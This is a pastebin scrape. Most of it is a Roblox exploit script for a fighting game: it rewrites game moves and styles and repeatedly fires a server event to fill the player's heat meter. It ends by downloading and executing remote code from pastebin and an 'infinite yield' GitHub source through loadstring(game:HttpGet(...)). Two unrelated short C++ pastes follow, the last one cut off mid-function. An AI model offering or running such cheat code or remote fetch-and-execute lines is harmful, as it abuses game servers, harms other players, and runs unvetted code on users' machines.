v.AnimationId = ""rbxassetid://11632565056""
v.Name = ""EvadeQCF""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""EvadeQCL"") then
v = game.ReplicatedStorage.Styles.Rush[""EvadeQCL""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Rush)
end

v.AnimationId = ""rbxassetid://11632564616""
v.Name = ""EvadeQCL""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""EvadeQCR"") then
v = game.ReplicatedStorage.Styles.Rush[""EvadeQCR""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Rush)
end

v.AnimationId = ""rbxassetid://11632564233""
v.Name = ""EvadeQCR""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""EvadeCF"") then
v = game.ReplicatedStorage.Styles.Rush[""EvadeCF""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Rush)
end

v.AnimationId = ""rbxassetid://11716395378""
v.Name = ""EvadeCF""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""EvadeCB"") then
v = game.ReplicatedStorage.Styles.Rush[""EvadeCB""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Rush)
end

v.AnimationId = ""rbxassetid://11716396028""
v.Name = ""EvadeCB""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Block"") then
v = game.ReplicatedStorage.Styles.Rush[""Block""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Rush)
end

v.AnimationId = ""rbxassetid://11776345813""
v.Name = ""Block""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""H_EvadedR"") then
v = game.ReplicatedStorage.Styles.Rush[""H_EvadedR""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'H_FastFootworkRight'
v.Name = ""H_EvadedR""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""H_EvadedL"") then
v = game.ReplicatedStorage.Styles.Rush[""H_EvadedL""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'H_FastFootworkLeft'
v.Name = ""H_EvadedL""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Idle"") then
v = game.ReplicatedStorage.Styles.Rush[""Idle""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Rush)
end

v.AnimationId = ""rbxassetid://12120045620""
v.Name = ""Idle""
if game.ReplicatedStorage.Styles.Rush.Idle:FindFirstChild(""Core"") then
v = game.ReplicatedStorage.Styles.Rush.Idle[""Core""]
else
v = Instance.new(""Folder"", game.ReplicatedStorage.Styles.Rush.Idle)
end
v.Name = ""Core""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Hit1Block"") then
v = game.ReplicatedStorage.Styles.Rush[""Hit1Block""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Rush)
end

v.AnimationId = ""rbxassetid://11959653217""
v.Name = ""Hit1Block""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Hit2Block"") then
v = game.ReplicatedStorage.Styles.Rush[""Hit2Block""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Rush)
end

v.AnimationId = ""rbxassetid://11959653217""
v.Name = ""Hit2Block""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Run"") then
v = game.ReplicatedStorage.Styles.Rush[""Run""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Rush)
end

v.AnimationId = ""rbxassetid://13731641248""
v.Name = ""Run""

if game.ReplicatedStorage.Styles:FindFirstChild(""Beast"") then
v = game.ReplicatedStorage.Styles[""Beast""]
else
v = Instance.new(""Folder"", game.ReplicatedStorage.Styles)
end
v.Name = ""Beast""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""Rush1"") then
v = game.ReplicatedStorage.Styles.Beast[""Rush1""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'BTPunch1'
v.Name = ""Rush1""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""Speed"") then
v = game.ReplicatedStorage.Styles.Beast[""Speed""]
else
v = Instance.new(""NumberValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 0.75
v.Name = ""Speed""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""StartBlock"") then
v = game.ReplicatedStorage.Styles.Beast[""StartBlock""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Beast)
end

v.AnimationId = ""rbxassetid://10920901524""
v.Name = ""StartBlock""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""GuardGrabHit"") then
v = game.ReplicatedStorage.Styles.Beast[""GuardGrabHit""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'T_BearHug'
v.Name = ""GuardGrabHit""
if game.ReplicatedStorage.Styles.Beast.GuardGrabHit:FindFirstChild(""Ability"") then
v = game.ReplicatedStorage.Styles.Beast.GuardGrabHit[""Ability""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast.GuardGrabHit)
end
v.Value = 'Bear Hug'
v.Name = ""Ability""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""Rush2"") then
v = game.ReplicatedStorage.Styles.Beast[""Rush2""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'BTPunch2'
v.Name = ""Rush2""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""Rush3"") then
v = game.ReplicatedStorage.Styles.Beast[""Rush3""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'BTPunch3'
v.Name = ""Rush3""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""Color"") then
v = game.ReplicatedStorage.Styles.Beast[""Color""]
else
v = Instance.new(""Color3Value"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = Color3.fromRGB(255, 240, 31)
v.Name = ""Color""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""H_LowHealthFallen"") then
v = game.ReplicatedStorage.Styles.Beast[""H_LowHealthFallen""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'H_FallenFinisher'
v.Name = ""H_LowHealthFallen""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""LThrow"") then
v = game.ReplicatedStorage.Styles.Beast[""LThrow""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'T_LegToss'
v.Name = ""LThrow""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""Strike1"") then
v = game.ReplicatedStorage.Styles.Beast[""Strike1""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'BTStrike1'
v.Name = ""Strike1""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""Strike2"") then
v = game.ReplicatedStorage.Styles.Beast[""Strike2""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'BTStrike2'
v.Name = ""Strike2""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""Strike3"") then
v = game.ReplicatedStorage.Styles.Beast[""Strike3""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'BTStrike3'
v.Name = ""Strike3""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""Strike4"") then
v = game.ReplicatedStorage.Styles.Beast[""Strike4""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'BTStrike4'
v.Name = ""Strike4""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""Grab"") then
v = game.ReplicatedStorage.Styles.Beast[""Grab""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'BGrab'
v.Name = ""Grab""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""EvadeB"") then
v = game.ReplicatedStorage.Styles.Beast[""EvadeB""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Beast)
end

v.AnimationId = ""rbxassetid://11614916809""
v.Name = ""EvadeB""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""RedHeat"") then
v = game.ReplicatedStorage.Styles.Beast[""RedHeat""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Name = ""RedHeat""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""VisualName"") then
v = game.ReplicatedStorage.Styles.Beast[""VisualName""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'Beast'
v.Name = ""VisualName""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""Throw"") then
v = game.ReplicatedStorage.Styles.Beast[""Throw""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'T_BeastToss'
v.Name = ""Throw""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""EvadeR"") then
v = game.ReplicatedStorage.Styles.Beast[""EvadeR""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Beast)
end

v.AnimationId = ""rbxassetid://8223592585""
v.Name = ""EvadeR""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""H_GrabOnWall"") then
v = game.ReplicatedStorage.Styles.Beast[""H_GrabOnWall""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'H_WallSmack'
v.Name = ""H_GrabOnWall""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""GrabCorpses"") then
v = game.ReplicatedStorage.Styles.Beast[""GrabCorpses""]
else
v = Instance.new(""Folder"", game.ReplicatedStorage.Styles.Beast)
end
v.Name = ""GrabCorpses""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""H_GrabStanding"") then
v = game.ReplicatedStorage.Styles.Beast[""H_GrabStanding""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'H_Piledriver'
v.Name = ""H_GrabStanding""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""H_AbsorbBlock"") then
v = game.ReplicatedStorage.Styles.Beast[""H_AbsorbBlock""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'H_Torment'
v.Name = ""H_AbsorbBlock""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""H_TwoHandeds"") then
v = game.ReplicatedStorage.Styles.Beast[""H_TwoHandeds""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'H_SelfDestruct'
v.Name = ""H_TwoHandeds""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""H_GrabLeg"") then
v = game.ReplicatedStorage.Styles.Beast[""H_GrabLeg""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'H_Swing'
v.Name = ""H_GrabLeg""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""Taunt"") then
v = game.ReplicatedStorage.Styles.Beast[""Taunt""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'BeastTaunt'
v.Name = ""Taunt""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""Hit2Block"") then
v = game.ReplicatedStorage.Styles.Beast[""Hit2Block""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Beast)
end

v.AnimationId = ""rbxassetid://10920909417""
v.Name = ""Hit2Block""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""EndBlock"") then
v = game.ReplicatedStorage.Styles.Beast[""EndBlock""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Beast)
end

v.AnimationId = ""rbxassetid://10920912941""
v.Name = ""EndBlock""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""Hit1Block"") then
v = game.ReplicatedStorage.Styles.Beast[""Hit1Block""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Beast)
end

v.AnimationId = ""rbxassetid://10920902836""
v.Name = ""Hit1Block""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""Block"") then
v = game.ReplicatedStorage.Styles.Beast[""Block""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Beast)
end

v.AnimationId = ""rbxassetid://10920916315""
v.Name = ""Block""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""H_GrabOnFallen"") then
v = game.ReplicatedStorage.Styles.Beast[""H_GrabOnFallen""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'H_LobCrush'
v.Name = ""H_GrabOnFallen""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""H_Stunned"") then
v = game.ReplicatedStorage.Styles.Beast[""H_Stunned""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'H_Knockout'
v.Name = ""H_Stunned""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""HThrow"") then
v = game.ReplicatedStorage.Styles.Beast[""HThrow""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'T_HeavyToss'
v.Name = ""HThrow""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""LHThrow"") then
v = game.ReplicatedStorage.Styles.Beast[""LHThrow""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'T_BHeavyToss'
v.Name = ""LHThrow""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""H_FallenDown"") then
v = game.ReplicatedStorage.Styles.Beast[""H_FallenDown""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'H_FallenGrate'
v.Name = ""H_FallenDown""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""H_Fallen"") then
v = game.ReplicatedStorage.Styles.Beast[""H_Fallen""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'H_FallenFinisher'
v.Name = ""H_Fallen""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""EvadeF"") then
v = game.ReplicatedStorage.Styles.Beast[""EvadeF""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Beast)
end

v.AnimationId = ""rbxassetid://11614916023""
v.Name = ""EvadeF""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""EvadeL"") then
v = game.ReplicatedStorage.Styles.Beast[""EvadeL""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Beast)
end

v.AnimationId = ""rbxassetid://8223592585""
v.Name = ""EvadeL""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""Idle"") then
v = game.ReplicatedStorage.Styles.Beast[""Idle""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Beast)
end

v.AnimationId = ""rbxassetid://13794669255""
v.Name = ""Idle""
if game.ReplicatedStorage.Styles.Beast.Idle:FindFirstChild(""Core"") then
v = game.ReplicatedStorage.Styles.Beast.Idle[""Core""]
else
v = Instance.new(""Folder"", game.ReplicatedStorage.Styles.Beast.Idle)
end
v.Name = ""Core""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""H_GrabStanding3"") then
v = game.ReplicatedStorage.Styles.Beast[""H_GrabStanding3""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'H_Entangle'
v.Name = ""H_GrabStanding3""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""H_StunnedFront"") then
v = game.ReplicatedStorage.Styles.Beast[""H_StunnedFront""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'H_KnockoutFront'
v.Name = ""H_StunnedFront""
if game.ReplicatedStorage.Moves[""ÈæçTigerDrop""]:FindFirstChild(""Anim"") then
v = game.ReplicatedStorage.Moves[""ÈæçTigerDrop""][""Anim""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Moves[""ÈæçTigerDrop""])
end
v.AnimationId = ""rbxassetid://12338275115"" 
v.Name = ""Anim""
if game.ReplicatedStorage.Moves[""ÈæçTigerDrop""]:FindFirstChild(""ForceSF"") then
v = game.ReplicatedStorage.Moves[""ÈæçTigerDrop""][""ForceSF""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Moves[""ÈæçTigerDrop""])
end
v.Value = '0.1' 
v.Name = ""ForceSF""
if game.ReplicatedStorage.Moves[""TigerDrop""]:FindFirstChild(""Anim"") then
v = game.ReplicatedStorage.Moves[""TigerDrop""][""Anim""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Moves[""TigerDrop""])
end
v.AnimationId = ""rbxassetid://12338275115"" 
v.Name = ""Anim""
if game.ReplicatedStorage.Moves[""TigerDrop""]:FindFirstChild(""HitDur"") then
v = game.ReplicatedStorage.Moves[""TigerDrop""][""HitDur""]
else
v = Instance.new(""NumberValue"", game.ReplicatedStorage.Moves[""TigerDrop""])
end
v.Value = 0.3 
v.Name = ""HitDur""
if game.ReplicatedStorage.Moves[""TigerDrop""]:FindFirstChild(""AniSpeed"") then
v = game.ReplicatedStorage.Moves[""TigerDrop""][""AniSpeed""]
else
v = Instance.new(""NumberValue"", game.ReplicatedStorage.Moves[""TigerDrop""])
end
v.Value = 1 
v.Name = ""AniSpeed""


local function playsound(id)
	local sfx = Instance.new(""Sound"", workspace)
	sfx.SoundId = ""rbxassetid://""..tostring(id)

	game:GetService(""SoundService""):PlayLocalSound(sfx)

	spawn(function()
		task.wait(sfx.TimeLength)
		sfx:Destroy()
	end)
end

function playticksound()
	local sfx = Instance.new(""Sound"", workspace)
	sfx.SoundId = ""rbxassetid://4843088994""

	game:GetService(""SoundService""):PlayLocalSound(sfx)

	spawn(function()
		task.wait(2)
		sfx:Destroy()
	end)
end

local function play_ingamesound(sfxname)
	local v = game.ReplicatedStorage.Sounds:FindFirstChild(sfxname)
	local sfx = Instance.new(""Sound"", nil)
	local id = v.Value

	sfx.SoundId = id

	for i,v in v:GetChildren() do
		sfx[v.Name] = v.Value
	end

	game.SoundService:PlayLocalSound(sfx)
	task.delay(15, function()
		sfx:Destroy()
	end)
end

local Player = game.Players.LocalPlayer
local Rep = game.ReplicatedStorage
local Char = Player.Character
local Main = Player.PlayerGui.Interface.Battle.Main

Main.HeatMove.TextLabel:GetPropertyChangedSignal(""Text""):Connect(function()
    if Main.HeatMove.TextLabel.Text == ""Ultimate Essence"" then
        Main.HeatMove.TextLabel.Text = Rep.Moves.H_UltimateEssence.MoveName.Value
        local Anim = Char.Humanoid:LoadAnimation(Rep.Moves.H_UltimateEssence.Anim)
        Anim.Priority = Enum.AnimationPriority.Action4
        Anim:AdjustSpeed(0.9)
        Anim:Play()
	play_ingamesound(""Ignite"")
        play_ingamesound(""Ignite"")
        play_ingamesound(""Laugh"")
        task.wait(0.4)
        play_ingamesound(""TakeAim"")
        task.wait(0.6)
        play_ingamesound(""BoneBreak"")
	play_ingamesound(""MassiveSlap"")

        task.wait(0.3)
        Anim:Destroy()
    end
end)


local Player = game.Players.LocalPlayer
local Rep = game.ReplicatedStorage
local Char = Player.Character
local Main = Player.PlayerGui.Interface.Battle.Main

Main.HeatMove.TextLabel:GetPropertyChangedSignal(""Text""):Connect(function()
    if Main.HeatMove.TextLabel.Text == ""Essence of Fast Footwork [Back]"" then
        Main.HeatMove.TextLabel.Text = Rep.Moves.H_SumoSlap.MoveName.Value
        local Anim = Char.Humanoid:LoadAnimation(Rep.Moves.H_SumoSlap.Anim)
        Anim.Priority = Enum.AnimationPriority.Action4
        Anim:AdjustSpeed(0.9)
        Anim:Play()
        play_ingamesound(""Teleport"")
        play_ingamesound(""Slap"")
        task.wait(0.55)
        play_ingamesound(""Slap"")
        task.wait(0.45)
        play_ingamesound(""Slap"")
        task.wait(0.8)
        play_ingamesound(""MassiveSlap"")
        Anim:Destroy()
    end
end)

local Player = game.Players.LocalPlayer
local Rep = game.ReplicatedStorage
local Char = Player.Character
local Main = Player.PlayerGui.Interface.Battle.Main

Main.HeatMove.TextLabel:GetPropertyChangedSignal(""Text""):Connect(function()
    if Main.HeatMove.TextLabel.Text == ""Essence of Fisticuffs"" then
        Main.HeatMove.TextLabel.Text = Rep.Moves.H_UltimateEssence.MoveName.Value
        local Anim = Char.Humanoid:LoadAnimation(Rep.Moves.H_UltimateEssence.Anim)
        Anim.Priority = Enum.AnimationPriority.Action4
        Anim:AdjustSpeed(0.9)
        Anim:Play()
        play_ingamesound(""Ignite"")
        play_ingamesound(""Ignite"")
        task.wait(0.3)
        play_ingamesound(""TakeAim"")
        task.wait(0.6)
        play_ingamesound(""Slap"")
        task.wait(0.9)
        play_ingamesound(""MassiveSlap"")
        Anim:Destroy()
    end
end)

local Player = game.Players.LocalPlayer
local Rep = game.ReplicatedStorage
local Char = Player.Character
local Main = Player.PlayerGui.Interface.Battle.Main

Main.HeatMove.TextLabel:GetPropertyChangedSignal(""Text""):Connect(function()
    if Main.HeatMove.TextLabel.Text == ""Essence of Whirl"" then
        Main.HeatMove.TextLabel.Text = Rep.Moves.H_KnockoutFront.MoveName.Value
        local Anim = Char.Humanoid:LoadAnimation(Rep.Moves.H_KnockoutFront.Anim)
        Anim.Priority = Enum.AnimationPriority.Action4
        Anim:AdjustSpeed(0.9)
        Anim:Play()
        play_ingamesound(""MetalBonk"")
        play_ingamesound(""MetalSmack"")
        task.wait(0.1)
        play_ingamesound(""MetalSmack"")
        task.wait(0.1)
        play_ingamesound(""MetalPipe"")
        task.wait(0.1)
        play_ingamesound(""MassiveSlap"")
        Anim:Destroy()
    end
end)

local Player = game.Players.LocalPlayer
local Rep = game.ReplicatedStorage
local Char = Player.Character
local Main = Player.PlayerGui.Interface.Battle.Main

Main.HeatMove.TextLabel:GetPropertyChangedSignal(""Text""):Connect(function()
    if Main.HeatMove.TextLabel.Text == ""Essence of Frenzy [Back]"" then
        Main.HeatMove.TextLabel.Text = Rep.Moves.H_SumoSlap.MoveName.Value
        local Anim = Char.Humanoid:LoadAnimation(Rep.Moves.H_SumoSlap.Anim)
        Anim.Priority = Enum.AnimationPriority.Action4
        Anim:AdjustSpeed(0.9)
        Anim:Play()
        play_ingamesound(""Teleport"")
        play_ingamesound(""Slap"")
        task.wait(0.55)
        play_ingamesound(""Slap"")
        task.wait(0.45)
        play_ingamesound(""Slap"")
        task.wait(0.8)
        play_ingamesound(""MassiveSlap"")
        Anim:Destroy()
    end
end)



local DragonText = ""Dragon""
local DragonColor = Color3.new(0.95, 0.05, 0.1)
local DragonSequence = ColorSequence.new({ColorSequenceKeypoint.new(0, DragonColor), ColorSequenceKeypoint.new(1, DragonColor)})
local moves = game.ReplicatedStorage.Moves
local styles = game.ReplicatedStorage.Styles
local plr = game.Players.LocalPlayer
local status = plr.Status

function isInBattle()
	return (plr:FindFirstChild(""InBattle"") and true or false)
end

function isDungeon()
	return game.ReplicatedStorage.Dungeon.Value
end

function doingHact()
	return (plr.Character:FindFirstChild(""Heated"") and true or false)
end

function showMaxHeatEffect()
	return (isInBattle() and not doingHact() and plr.Status.Heat.Value >= 100) and true or false
end

function hasWeaponInHand()
	return (plr.Character:FindFirstChild(""Holding"") and true or false)
end

local function change_color()
	if status.Style.Value == ""Brawler"" then
		local DragonSequence = ColorSequence.new{ColorSequenceKeypoint.new(0, styles.Brawler.Color.Value), ColorSequenceKeypoint.new(1, styles.Brawler.Color.Value)}
		local char = plr.Character
		char.HumanoidRootPart.Fire_Main.Color = DragonSequence
		char.HumanoidRootPart.Fire_Secondary.Color = DragonSequence
		char.HumanoidRootPart.Fire_Main.Rate = status.Heat.Value >= 100 and 115 or status.Heat.Value >= 75 and 85 or 80
		char.HumanoidRootPart.Fire_Secondary.Rate = status.Heat.Value >= 100 and 90 or status.Heat.Value >= 75 and 80 or 70
		char.HumanoidRootPart.Lines1.Color = DragonSequence
		char.HumanoidRootPart.Lines1.Rate = status.Heat.Value >= 100 and 60 or status.Heat.Value >= 75 and 40 or 20
		char.HumanoidRootPart.Lines2.Color = DragonSequence
		char.HumanoidRootPart.Lines2.Rate = status.Heat.Value >= 100 and 60 or status.Heat.Value >= 75 and 40 or 20
		char.HumanoidRootPart.Sparks.Color = DragonSequence
		if not char.HumanoidRootPart.TimeFor.Enabled then
			char.HumanoidRootPart.TimeFor.Color = DragonSequence
		end

		char.UpperTorso[""r2f_aura_burst""].Lines1.Color = DragonSequence
		char.UpperTorso[""r2f_aura_burst""].Lines2.Color = DragonSequence
		char.UpperTorso[""r2f_aura_burst""].Flare.Color = DragonSequence
		char.UpperTorso[""r2f_aura_burst""].Lines1.Enabled = showMaxHeatEffect()
		char.UpperTorso[""r2f_aura_burst""].Flare.Enabled = showMaxHeatEffect()
		char.UpperTorso[""r2f_aura_burst""].Smoke.Color = DragonSequence
		char.UpperTorso.Evading.Color = DragonSequence
	end
end

local function FillHeat()
	local Event = game:GetService(""ReplicatedStorage"").Events.ME

	for i=1,6 do
		local A_1 =  {
			[1] = ""heat"", 
			[2] = game:GetService(""ReplicatedStorage"").Moves.Taunt
		}
		Event:FireServer(A_1)
	end
end

game:GetService(""RunService"").RenderStepped:Connect(change_color)

plr.Character.ChildAdded:Connect(function(v)
	if v.Name == 'Grabbing' then
		while v.Parent == plr.Character do
			if status.Heat.Value ~= 100 then
				FillHeat()
			end
			task.wait(0.05)
		end
	end
end)

if moves:FindFirstChild(""ÈæçTigerDrop"") then
        moves:FindFirstChild(""BRCounter2"").Name = ""FakeCounter2""
        moves:FindFirstChild(""ÈæçTigerDrop"").Name = ""BRCounter2""
        moves:FindFirstChild(""BRCounter1"").Name = ""FakeCounter1""
        moves:FindFirstChild(""BRGrab"").Name = ""FakeGrab""

        local ignore = Instance.new(""Folder"")
        ignore.Name = ""IgnoreDmg""
        ignore.Parent = moves:FindFirstChild(""BRCounter2"")

        if not moves:FindFirstChild(""BRCounter2""):FindFirstChild(""HSize"") then
            local n = Instance.new(""NumberValue"")
            n.Name = ""HSize""
            n.Value = 2
            n.Parent = moves:FindFirstChild(""BRCounter2"")
        end
    end

function playticksound()
	local sfx = Instance.new(""Sound"", workspace)
	sfx.SoundId = ""rbxassetid://12222183""
	sfx.Volume = 2

	game:GetService(""SoundService""):PlayLocalSound(sfx)

	spawn(function()
		wait(2)
		sfx:Destroy()
	end)
end

local notifyevent 
for i,v in pairs (pgui:GetChildren()) do
    if v:IsA(""BindableEvent"") then
        notifyevent = v
    end
end

local function sendNotification(text, color, sound)
    if not color then color = Color3.new(1, 1, 1) end
    pgui.NotifyUI.Awards.ChildAdded:Once(function(c)
        if c.Text == text then
            c.TextColor3 = color
            coroutine.wrap(function()
                local con;
                con = game:GetService(""RunService"").RenderStepped:Connect(function()
                    if not c then
                        con:Disconnect()
                        return
                    end
                    c.TextColor3 = color
                end)()
            end)()
        end
    end)
    notifyevent:Fire(text, sound or nil)
end

menu.Bars.Mobile_Title.Text = ""Jake Legend style!""

local uis = game:GetService(""UserInputService"")
local rushstyle = game.ReplicatedStorage.Styles.Rush
local brawlerstyle = game.ReplicatedStorage.Styles.Brawler
local beaststyle = game.ReplicatedStorage.Styles.Beast

local grabstrike = rushstyle:WaitForChild(""GrabStrike""):Clone()
local guruparry = brawlerstyle:WaitForChild(""GrabStrike"")

sendNotification(""Press X to swap counter step and parry on legend style"", color)

uis.InputBegan:Connect(function(key)
	if game.UserInputService:GetFocusedTextBox() == nil then
		if key.KeyCode == Enum.KeyCode.X then
			playticksound()
			if guruparry.Parent ~= nil then
				guruparry.Parent = nil
				grabstrike.Parent = brawlerstyle
				sendNotification(""Counter Quickstep Enabled"", color)
			else
			guruparry.Parent = brawlerstyle
				grabstrike.Parent = nil
				sendNotification(""Parry Enabled"", color)
			end
		end
	end
end)

local plr = game.Players.LocalPlayer
local pgui = plr.PlayerGui
local interf = pgui.Interface

game.ReplicatedStorage.Moves.TigerDrop.Anim.AnimationId = ""rbxassetid://12120052426""
interf.Client.Disabled = true
task.wait(0.1)
interf.Client.Disabled = false


local plr = game.Players.LocalPlayer
local pgui = plr.PlayerGui
local interf = pgui.Interface

game.ReplicatedStorage.Moves.BRCounter2.Anim.AnimationId = ""rbxassetid://12120052426""
game.ReplicatedStorage.Moves.H_GUltimateEssence.Anim.AnimationId = ""rbxassetid://12338287890""
interf.Client.Disabled = true
task.wait(0.1)
interf.Client.Disabled = false

loadstring(game:HttpGet(""https://pastebin.com/raw/gsxvWvnj""))() 

loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIYinfiniteyield/master/source'))()"
rnbhiD2F,Untitled,Josif_tepe,C++,Tuesday 23rd of April 2024 08:00:51 AM CDT,"#include <stdio.h>

int main()
{
    int n, m;
    scanf(""%d%d"", &n, &m);

    int mat[n][m];
    for(int i = 0; i < n; i++) {
        for(int j = 0; j < m; j++) {
            scanf(""%d"", &mat[i][j]);
        }
    }

    for(int i = 0; i < n; i++) {
        int zbir = 0;
        for(int j = 1; j < m; j++) {
            zbir += mat[i][j];
        }
        if(mat[i][0] == zbir) {
            printf(""%d\n"", mat[i][0]);
        }
    }
    return 0;
}
"
2YPcGWkz,optimized_kmp,maxim_shlyahtin,C++,Tuesday 23rd of April 2024 07:58:51 AM CDT,"#include <iostream>
#include <vector>
#include <string>

void form_suffix_array(std::vector<int>& pi, std::string& a) {
	int j = 0, i = 1;
	while (i < a.length()) {
		if (a[i] != a[j]) {
			if (j == 0 && pi[i] == 0) {
				++i;
			}
			else {
				j = pi[j - 1];
			}
		}
		else {
			pi[i] = j + 1;
			++i;
			++j;
		}
	}
}

void print_str(std::string& str, int start, int end) {
